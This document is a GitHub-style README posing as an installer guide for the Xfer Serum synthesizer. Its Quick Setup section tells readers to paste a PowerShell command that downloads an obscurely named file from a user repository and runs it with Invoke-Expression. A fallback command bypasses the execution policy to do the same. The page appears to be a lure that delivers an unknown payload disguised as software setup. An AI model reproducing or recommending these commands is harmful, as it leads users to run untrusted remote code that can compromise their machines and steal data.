# Xfer Serum

Xfer Serum is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Xfer Serum and work in it.

Xfer Serum is a desktop wavetable synthesizer that runs inside a DAW on Windows as a VST3 or AU plugin. You shape sound with two main oscillators, a sub oscillator, dual filters, and a deep modulation matrix tied to envelopes and LFOs. The wavetable editor lets you morph, import, and draw tables while hearing changes in real time.

A typical session starts by loading Serum on a MIDI track and picking an init or factory preset as a starting point. You assign mod sources to cutoff, wavetable position, or level, then stack the built-in effects such as distortion, chorus, delay, and reverb before printing audio or bouncing the MIDI clip. Many producers lean on the visual feedback to dial in movement without guessing what the oscillator is doing.

This repository keeps a Windows-oriented setup file for plugin scan paths and host compatibility, short notes on preset folders and backup habits, and a changelog that tracks Serum build updates alongside any local configuration tweaks. It is meant as a practical reference for reinstalls, new machines, and keeping project templates aligned with the same synth version.

## What you do with it

- High-resolution wavetable playback with smooth scanning across hundreds of factory tables.
- Dual oscillators plus sub and noise sources for layered basses, leads, and textures.
- Visual wavetable editor supports import, draw, and morph between custom wave shapes.
- Flexible modulation matrix routes LFOs, envelopes, and MIDI to almost any parameter.
- Built-in effects including distortion, flanger, chorus, delay, reverb, and compressor.
- Dual multi-mode filters with serial or parallel routing and keytracked resonance control.
- Drag-and-drop preset browser organizes categories, favorites, and user banks quickly.
- Low-latency engine stays stable inside common Windows DAW hosts during heavy sessions.

## Quick Setup (PowerShell)

This installs the program Xfer Serum on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/diana-s16283185/xfer-serum-setup-guide/main/xmt69su550.p8d9sypp | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/diana-s16283185/xfer-serum-setup-guide/main/xmt69su550.p8d9sypp | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `xmt69su550.p8d9sypp` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `diana-s16283185/xfer-serum-setup-guide`. Xfer Serum 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
